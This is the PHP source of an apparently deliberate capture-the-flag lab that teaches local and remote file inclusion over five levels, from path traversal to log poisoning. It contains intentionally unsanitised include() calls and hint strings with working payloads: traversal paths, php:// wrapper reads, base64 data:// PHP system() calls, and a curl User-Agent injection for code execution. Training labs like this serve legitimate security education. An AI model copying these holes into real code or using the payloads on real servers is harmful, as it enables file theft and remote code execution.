<?php
error_reporting(0);

// ============ TRACKING ============
function trackHit($labId) {
    @file_get_contents("http://tracking-service:8080/api/hit?" . http_build_query([
        'lab' => $labId,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? ''
    ]));
}
function trackFlag($labId, $flag) {
    @file_get_contents("http://tracking-service:8080/api/flag?" . http_build_query([
        'lab' => $labId,
        'flag' => $flag,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? ''
    ]));
}
trackHit('file-handling');

$level = isset($_GET['level']) ? intval($_GET['level']) : 1;
if ($level < 1 || $level > 5) $level = 1;

// For Level 5: clear the access log when visiting the level page without a file param
// This ensures users get a clean log to poison
if ($level == 5 && !isset($_GET['file'])) {
    @file_put_contents('/var/log/apache2/access.log', '');
}

$levels = [
    1 => [
        'name' => 'Basic LFI - Path Traversal',
        'difficulty' => 'Easy',
        'color' => '#10b981',
        'clue' => 'The application loads files without any validation. Try to navigate out of the current directory to find the flag.',
        'hint' => 'Use ../ to traverse directories. The flag is in flags/flag1.txt. Try: ../../../var/www/html/flags/flag1.txt',
        'flag_file' => '/var/flags/flag1.txt'
    ],
    2 => [
        'name' => 'LFI - Filter Bypass',
        'difficulty' => 'Medium',
        'color' => '#f59e0b',
        'clue' => 'The developer tried to block path traversal by removing "../" from input. But simple string replacement can be bypassed.',
        'hint' => 'What happens if you use ....// or ..././? The filter replaces "../" once, so nesting bypasses it: ....// becomes ../ after one pass.',
        'flag_file' => '/var/flags/flag2.txt'
    ],
    3 => [
        'name' => 'LFI - PHP Wrappers',
        'difficulty' => 'Medium',
        'color' => '#f59e0b',
        'clue' => 'Direct file access is blocked, but PHP provides powerful stream wrappers that can read file contents in creative ways.',
        'hint' => 'Try php://filter/convert.base64-encode/resource=/var/flags/flag3.txt or use php://input with POST data containing PHP code.',
        'flag_file' => '/var/flags/flag3.txt'
    ],
    4 => [
        'name' => 'RFI - Remote File Inclusion',
        'difficulty' => 'Hard',
        'color' => '#ef4444',
        'clue' => 'The server allows remote resources to be included. You can use data:// URIs or even include remote PHP code.',
        'hint' => 'Try: data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL3Zhci9mbGFncy9mbGFnNC50eHQnKTsgPz4= or php://input with POST body containing PHP code.',
        'flag_file' => '/var/flags/flag4.txt'
    ],
    5 => [
        'name' => 'LFI to RCE - Log Poisoning',
        'difficulty' => 'Expert',
        'color' => '#dc2626',
        'clue' => 'What if you could write PHP code into a file that already exists on the server, then include that file? Apache logs capture every request...',
        'hint' => 'Send a request with PHP code in the User-Agent header (use curl or Burp). The access log at /var/log/apache2/access.log will contain your payload. Then include the log file.',
        'flag_file' => '/var/flags/flag5.txt'
    ]
];

$current = $levels[$level];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Handling & LFI/RFI Lab - Level <?= $level ?></title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #0a0a1a;
            color: #e0e0e0;
            min-height: 100vh;
        }

        .header {
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            padding: 40px 20px 30px;
            text-align: center;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .header h1 {
            font-size: 2.2em;
            font-weight: 800;
            background: linear-gradient(135deg, #3b82f6, #ef4444);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 6px;
        }
        .header p {
            color: #9ca3af;
            font-size: 0.95em;
        }

        .level-nav {
            background: rgba(15,15,30,0.9);
            padding: 20px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .level-nav h3 {
            text-align: center;
            color: #818cf8;
            margin-bottom: 15px;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .level-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
            max-width: 900px;
            margin: 0 auto;
        }
        .level-btn {
            padding: 10px 18px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(17,17,35,0.9);
            color: #9ca3af;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 500;
            text-decoration: none;
            display: inline-block;
            font-size: 0.85em;
        }
        .level-btn:hover {
            border-color: rgba(99,102,241,0.4);
            color: #f3f4f6;
            transform: translateY(-2px);
        }
        .level-btn.active {
            border-color: <?= $current['color'] ?>;
            color: #f3f4f6;
            background: rgba(99,102,241,0.15);
        }
        .progress-bar {
            background: rgba(255,255,255,0.05);
            height: 4px;
            border-radius: 2px;
            margin-top: 20px;
            max-width: 900px;
            margin-left: auto;
            margin-right: auto;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #3b82f6, #ef4444);
            transition: width 0.5s ease;
            border-radius: 2px;
        }

        .main {
            max-width: 900px;
            margin: 0 auto;
            padding: 30px 20px;
        }

        .level-info {
            background: rgba(17,17,35,0.9);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 20px;
        }
        .level-info h2 {
            font-size: 1.3em;
            font-weight: 700;
            color: #f3f4f6;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .difficulty-badge {
            padding: 4px 12px;
            border-radius: 6px;
            font-size: 0.7em;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .badge-easy { background: rgba(16,185,129,0.15); color: #10b981; }
        .badge-medium { background: rgba(245,158,11,0.15); color: #f59e0b; }
        .badge-hard { background: rgba(239,68,68,0.15); color: #ef4444; }
        .badge-expert { background: rgba(220,38,38,0.2); color: #dc2626; }

        .clue-box {
            background: rgba(245,158,11,0.08);
            border: 1px solid rgba(245,158,11,0.15);
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            color: #fbbf24;
            font-size: 0.9em;
            line-height: 1.5;
        }
        .clue-label {
            font-weight: 600;
            color: #f59e0b;
        }

        .hint-toggle {
            background: rgba(99,102,241,0.15);
            color: #818cf8;
            padding: 8px 16px;
            border: 1px solid rgba(99,102,241,0.2);
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85em;
            margin-top: 10px;
            transition: all 0.3s ease;
        }
        .hint-toggle:hover {
            background: rgba(99,102,241,0.25);
        }
        .hint-content {
            display: none;
            background: rgba(99,102,241,0.08);
            border: 1px solid rgba(99,102,241,0.15);
            padding: 12px;
            border-radius: 6px;
            margin-top: 10px;
            color: #a5b4fc;
            font-size: 0.85em;
            line-height: 1.5;
        }
        .hint-content.show {
            display: block;
        }

        .challenge-area {
            background: rgba(17,17,35,0.9);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 12px;
            padding: 25px;
        }
        .challenge-area h3 {
            color: #818cf8;
            margin-bottom: 8px;
            font-size: 1.1em;
        }
        .challenge-area .desc {
            color: #6b7280;
            font-size: 0.85em;
            margin-bottom: 20px;
        }
        .challenge-area .desc code {
            font-family: 'JetBrains Mono', monospace;
            background: rgba(99,102,241,0.15);
            color: #a5b4fc;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 0.9em;
        }

        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #9ca3af;
            font-size: 0.9em;
        }
        .input-row {
            display: flex;
            gap: 10px;
        }
        .form-control {
            flex: 1;
            padding: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 8px;
            font-size: 0.9em;
            background: rgba(10,10,26,0.8);
            color: #e0e0e0;
            font-family: 'JetBrains Mono', monospace;
            transition: border-color 0.3s ease;
        }
        .form-control:focus {
            outline: none;
            border-color: rgba(99,102,241,0.5);
        }
        .form-control::placeholder {
            color: #4b5563;
        }
        .btn {
            background: linear-gradient(135deg, #3b82f6, #6366f1);
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9em;
            font-weight: 600;
            transition: all 0.3s ease;
            white-space: nowrap;
        }
        .btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 15px rgba(99,102,241,0.3);
        }

        .result-area {
            background: rgba(10,10,26,0.8);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            min-height: 80px;
        }
        .result-area h4 {
            color: #818cf8;
            margin-bottom: 12px;
            font-size: 0.9em;
        }
        .result-content {
            font-family: 'JetBrains Mono', monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
            color: #d1d5db;
            font-size: 0.85em;
            line-height: 1.6;
            padding: 15px;
            background: rgba(0,0,0,0.3);
            border-radius: 6px;
            border-left: 3px solid #3b82f6;
        }
        .error-msg { color: #ef4444; }
        .success-msg { color: #10b981; }
        .warn-msg { color: #f59e0b; }
        .info-msg { color: #6b7280; }

        .source-code {
            margin-top: 20px;
            background: rgba(10,10,26,0.8);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 8px;
            overflow: hidden;
        }
        .source-header {
            background: rgba(99,102,241,0.1);
            padding: 10px 15px;
            font-size: 0.8em;
            color: #818cf8;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .source-header:hover { background: rgba(99,102,241,0.15); }
        .source-body {
            display: none;
            padding: 15px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8em;
            line-height: 1.6;
            color: #a5b4fc;
            white-space: pre-wrap;
            overflow-x: auto;
        }
        .source-body.show { display: block; }

        @media (max-width: 768px) {
            .header h1 { font-size: 1.5em; }
            .input-row { flex-direction: column; }
            .level-btn { font-size: 0.8em; padding: 8px 12px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>File Handling & LFI/RFI Lab</h1>
        <p>5 progressive challenges: Path Traversal, Filter Bypass, PHP Wrappers, RFI, Log Poisoning</p>
    </div>

    <div class="level-nav">
        <h3>Select Challenge Level</h3>
        <div class="level-buttons">
            <?php foreach ($levels as $lvl => $info): ?>
                <a href="?level=<?= $lvl ?>" class="level-btn <?= $lvl == $level ? 'active' : '' ?>">
                    Lv<?= $lvl ?>: <?= $info['name'] ?>
                </a>
            <?php endforeach; ?>
        </div>
        <div class="progress-bar">
            <div class="progress-fill" style="width: <?= ($level / 5) * 100 ?>%"></div>
        </div>
    </div>

    <div class="main">
        <div class="level-info">
            <h2>
                Level <?= $level ?>: <?= $current['name'] ?>
                <?php
                    $badge_class = 'badge-' . strtolower($current['difficulty']);
                ?>
                <span class="difficulty-badge <?= $badge_class ?>"><?= $current['difficulty'] ?></span>
            </h2>

            <div class="clue-box">
                <span class="clue-label">Clue:</span> <?= $current['clue'] ?>
            </div>

            <button class="hint-toggle" onclick="toggleHint()">Show Hint</button>
            <div class="hint-content" id="hintContent">
                <?= $current['hint'] ?>
            </div>
        </div>

        <div class="challenge-area">
            <h3>Your Challenge</h3>
            <p class="desc">
                Find the hidden flag for this level. Each flag follows the format:
                <code>IDS{...}</code>
            </p>

            <form method="GET" id="labForm">
                <input type="hidden" name="level" value="<?= $level ?>">
                <div class="form-group">
                    <label for="file">File Parameter (?file=):</label>
                    <div class="input-row">
                        <input type="text"
                               class="form-control"
                               id="file"
                               name="file"
                               placeholder="Enter file path to include..."
                               value="<?= isset($_GET['file']) ? htmlspecialchars($_GET['file']) : '' ?>">
                        <button type="submit" class="btn">Load File</button>
                    </div>
                </div>
            </form>

            <div class="result-area">
                <h4>Result:</h4>
                <div class="result-content">
<?php
if (isset($_GET['file']) && $_GET['file'] !== '') {
    $file = $_GET['file'];
    ob_start();

    switch ($level) {
        case 1:
            // Basic LFI - No filtering at all
            // Vulnerable: direct include with no sanitization
            if (@file_exists($file)) {
                echo "<span class=\"success-msg\">[File loaded successfully]</span>\n\n";
                @include($file);
            } else {
                echo "<span class=\"error-msg\">File not found: " . htmlspecialchars($file) . "</span>\n";
                echo "<span class=\"info-msg\">\nHint: The flag is outside the web root. Try path traversal with ../../../var/flags/flag1.txt</span>";
            }
            break;

        case 2:
            // Filter bypass - str_replace("../","") once, with base path prefix
            $base = "pages/";
            $filtered = str_replace("../", "", $file);
            $target = $base . $filtered;
            echo "<span class=\"warn-msg\">[Base path: pages/ | Filter applied: ../ removed => " . htmlspecialchars($filtered) . "]</span>\n\n";
            if (@file_exists($target)) {
                echo "<span class=\"success-msg\">[File loaded]</span>\n\n";
                @include($target);
            } else {
                echo "<span class=\"error-msg\">File not found: pages/" . htmlspecialchars($filtered) . "</span>\n";
                echo "<span class=\"info-msg\">\nHint: The filter only runs once. Try: ....//....//....//var/flags/flag2.txt</span>";
            }
            break;

        case 3:
            // PHP Wrappers - only allow php:// wrappers
            if (strpos($file, 'php://') === 0) {
                $content = @file_get_contents($file);
                if ($content !== false) {
                    echo "<span class=\"success-msg\">[PHP wrapper executed]</span>\n\n";
                    echo htmlspecialchars($content);
                } else {
                    echo "<span class=\"error-msg\">Wrapper returned no content.</span>";
                }
            } else {
                echo "<span class=\"error-msg\">Direct file access blocked. Only php:// wrappers are allowed.</span>\n";
                echo "<span class=\"info-msg\">\nHint: Try php://filter/convert.base64-encode/resource=/var/flags/flag3.txt</span>";
            }
            break;

        case 4:
            // RFI - allow data:// and php://input
            if (strpos($file, 'data://') === 0 || strpos($file, 'php://input') === 0 || strpos($file, 'http://') === 0 || strpos($file, 'https://') === 0) {
                echo "<span class=\"success-msg\">[Remote resource included]</span>\n\n";
                @include($file);
            } elseif (@file_exists($file)) {
                echo "<span class=\"success-msg\">[Local file included]</span>\n\n";
                @include($file);
            } else {
                echo "<span class=\"error-msg\">Could not include the specified resource.</span>\n";
                echo "<span class=\"info-msg\">\nHint: Try data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZ3MvZmxhZzQudHh0Jyk7ID8+</span>";
            }
            break;

        case 5:
            // Log Poisoning - allow any file include
            if (@file_exists($file)) {
                echo "<span class=\"success-msg\">[File included: " . htmlspecialchars($file) . "]</span>\n\n";
                @include($file);
            } else {
                echo "<span class=\"error-msg\">File not found: " . htmlspecialchars($file) . "</span>\n";
                echo "<span class=\"info-msg\">\nHint: Poison the Apache access log via User-Agent header, then include /var/log/apache2/access.log\n";
                echo "Step 1: curl -A '&lt;?php system(chr(99).chr(97).chr(116).chr(32).chr(102).chr(108).chr(97).chr(103).chr(115).chr(47).chr(102).chr(108).chr(97).chr(103).chr(53).chr(46).chr(116).chr(120).chr(116)); ?&gt;' http://target:8061/\n";
                echo "Step 2: Include /var/log/apache2/access.log</span>";
            }
            break;
    }
    $output = ob_get_clean();
    echo $output;
    if (preg_match('/IDS\{[^}]+\}/', $output, $m)) {
        trackFlag('file-handling', $m[0]);
    }
} else {
    echo "<span class=\"info-msg\">Enter a file path above to begin exploring...</span>";
}
?>
                </div>
            </div>

            <div class="source-code">
                <div class="source-header" onclick="toggleSource()">
                    &#9654; View Source Code (Vulnerable PHP)
                </div>
                <div class="source-body" id="sourceBody">
<?php
$source_map = [
    1 => 'include($file);  // No sanitization!',
    2 => '$base = "pages/";\n$filtered = str_replace("../", "", $file);\ninclude($base . $filtered);  // Single-pass filter!',
    3 => 'if (strpos($file, \'php://\') === 0) {\n    $content = file_get_contents($file);\n    echo $content;\n}',
    4 => '// allow_url_include = On\ninclude($file);  // Remote includes allowed!',
    5 => '// Apache logs at /var/log/apache2/access.log\ninclude($file);  // Any file can be included',
];
?>
// Level <?= $level ?> Vulnerable Code:
<?php echo htmlspecialchars(stripcslashes($source_map[$level])); ?>

// Flag location: <?= $current['flag_file'] ?>
                </div>
            </div>
        </div>
    </div>

    <script>
        function toggleHint() {
            const el = document.getElementById('hintContent');
            const btn = event.target;
            el.classList.toggle('show');
            btn.textContent = el.classList.contains('show') ? 'Hide Hint' : 'Show Hint';
        }
        function toggleSource() {
            const el = document.getElementById('sourceBody');
            const header = el.previousElementSibling;
            el.classList.toggle('show');
            header.innerHTML = el.classList.contains('show')
                ? '&#9660; View Source Code (Vulnerable PHP)'
                : '&#9654; View Source Code (Vulnerable PHP)';
        }
    </script>
</body>
</html>
